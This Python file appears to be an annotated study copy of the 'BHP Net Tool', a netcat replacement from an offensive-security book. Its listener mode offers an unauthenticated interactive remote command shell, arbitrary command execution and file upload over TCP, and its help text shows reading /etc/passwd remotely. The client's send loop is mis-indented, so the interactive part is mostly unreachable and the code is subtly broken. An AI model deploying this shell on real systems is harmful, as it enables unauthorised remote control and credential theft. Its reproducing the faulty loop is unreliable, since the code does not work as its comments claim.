# import necessary libs
import argparse
import socket
import shlex
import subprocess
import sys
import textwrap
import threading

# set up execute function
def execute(cmd):
    cmd = cmd.strip()
    if not cmd:
        return
    # use subprocess lib (check_output) to run a command on local OS and return the output from that command.
    output = subprocess.check_output(shlex.split(cmd),stderr=subprocess.STDOUT)
    
    return output.decode()

# CLIENT CODE ----

# initialize NetCat obj w/ argument from the command line and the buffer
class NetCat:
    def __init__(self, args, buffer=None):
        self.args = args
        self.buffer = buffer
        # create socket obj
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    def run(self):
            if self.args.listen:
                # setting up listener call listen method
                self.listen()
            else:
                # otherwise call the send method
                self.send()
# SEND method
    def send(self):
        # connect to target and port
        self.socket.connect((self.args.target, self.args.port))
        # if buffer exists send to target first
        if self.buffer:
            self.socket.send(self.buffer)
        # try/catch block to manually close connection with ctrl+c
        try:
            # start a loop to receive data from the target
            while True:
                recv_len = 1
                response = ''
                while recv_len:
                    data = self.socket.recv(4096)
                    recv_len = len(data)
                    response += data.decode()
                    # if there is no more data break out of loop
                    if recv_len < 4096:
                        break
                    if response:
                        #print response data and pause to get interactive input
                        print(response)
                        buffer = input('>')
                        buffer += '\n'
                        # send that input, continue loop
                        self.socket.send(buffer.encode())
        # as before loop will continue while there is data unless CTRL+C is pressed
        except KeyboardInterrupt:
            print('User terminated...')
            self.socket.close()
            sys.exit()

# LISTENER method
    def listen(self):
        # listen method binds target and port to listen
        self.socket.bind((self.args.target, self.args.port))
        self.socket.listen(5)
        # starts listening in a loop    
        while True:
            client_socket, _ = self.socket.accept()
            # passes connected socket to the handle method
            client_thread = threading.Thread(
                target=self.handle, args=(client_socket,)
            )
            client_thread.start()

# logic to perform file uploads, execute commands, and create interactive shell
# can be performed while operating as a listener
    def handle(self, client_socket):
        # if a command is executed the handle method passes command to the execute fiction and send the output back on the socket
        if self.args.execute:
            output = execute(self.args.execute)
            client_socket.send(output.encode())

        # if a file is uploaded set up a loop to listen for content on the listening socket and receive data until no more data coming in
        elif self.args.upload:
            file_buffer = b''
            while True:
                data = client_socket.recv(4096)
                if data:
                    file_buffer += data
                else:
                    break
            with open(self.args.upload, 'wb') as f:
                f.write(file_buffer)
            message = f'Saved file {self.args.upload}'
            client_socket.send(message.encode())

        # if shell is created set up a loop send a prompt to the sender and wait for a command string to  come back.
        elif self.args.command:
            cmd_buffer = b''
            while True:
                try:
                    client_socket.send(b'BHP: #> ')
                    while '\n' not in cmd_buffer.decode():
                        cmd_buffer += client_socket.recv(64)
                    # execute command using execute fuction
                    response = execute(cmd_buffer.decode())
                    # return output of the command to sender
                    if response:
                        client_socket.send(response.encode())
                    cmd_buffer = b''
                except Exception as e:
                    print(f'server killed {e}')
                    self.socket.close()
                    sys.exit()


# MAIN BLOCK ----

if __name__ == '__main__':
    # create a command line ineterface
    parser = argparse.ArgumentParser(
        # provide example usage that will display if --help is envoked
        description='BHP Net Tool',formatter_class=argparse.RawDescriptionHelpFormatter,epilog=textwrap.dedent('''Example: 
            netcat.py -t 192.168.1.108 -p 5555 -l -c # command shell
            netcat.py -t 192.168.1.108 -p 5555 -l -u=mytest.txt # upload to file
            netcat.py -t 192.168.1.108 -p 5555 -l -e=\"cat /etc/passwd\" # execute command
            echo 'ABC' | ./netcat.py -t 192.168.1.108 -p 135 # echo text to server port 135
            netcat.py -t 192.168.1.108 -p 5555 # connect to server
        '''))
    # arguments that specify how we want the program top behave
    # -c argument set up interactive shell
    parser.add_argument('-c', '--command', action='store_true', help='command shell')
    # -e argument executes one specific command    
    parser.add_argument('-e', '--execute', help='execute specific command')
    # -l argument indicates that a listener should be set up
    parser.add_argument('-l', '--listen', action='store_true', help='listen')
    # -p argument specifies the target PORT to communicate
    parser.add_argument('-p', '--port', type=int, default=5555, help='specified port')
    # -t argument specifies target IP
    parser.add_argument('-t', '--target', default='192.168.1.203', help='specified IP')
    # -u argument specifies the name of a file to upload
    parser.add_argument('-u', '--upload', help='upload file')
    # both sender and receiver can use program, arguments define whether it's invoked to send or listen
    # -c, -e, and -u imply -l argument = listener side of communication | sender side makes connection to listenr and only need -t and -p
    args = parser.parse_args()
    # if setting up listener, we invoke NetCat object with empty buffer string
    if args.listen:
        buffer = ''
    # otherwise; send buffer content from stdin
    else:
        buffer = sys.stdin.read()

    nc = NetCat(args, buffer.encode())
    # run starts it all up
    nc.run()